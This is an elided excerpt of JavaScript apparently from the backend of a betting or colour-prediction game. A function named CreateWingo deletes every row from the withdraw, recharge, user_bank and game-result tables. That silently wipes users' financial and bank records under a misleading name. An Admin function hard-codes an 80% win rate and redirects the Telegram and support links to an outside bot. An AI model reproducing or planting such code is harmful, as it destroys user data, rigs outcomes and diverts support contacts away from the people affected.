...
const CreateWingo = async(req, res) => {
    ...
    await connection.execute('DELETE FROM minutes_1');
await connection.execute('DELETE FROM roses');
await connection.execute('DELETE FROM withdraw');
await connection.execute('DELETE FROM user_bank');await connection.execute('DELETE FROM result_k3');
await connection.execute('DELETE FROM result_5d');
await connection.execute('DELETE FROM recharge');
// await connection.execute('DELETE FROM aviator');
...
const Admin = async(req, res) => {
    ...
    await connection.execute("INSERT INTO `admin` (`id`, `wingo1`, `wingo3`, `wingo5`, `wingo10`, `k5d`, `k5d3`, `k5d5`, `k5d10`, `win_rate`, `telegram`, `cskh`, `app`) VALUES (NULL, '-1', '-1', '-1', '-1', '-1', '-1', '-1', '-1', '80', 'https://t.me/selfhealerbot', 'https://t.me/selfhealerbot', '#')");
}
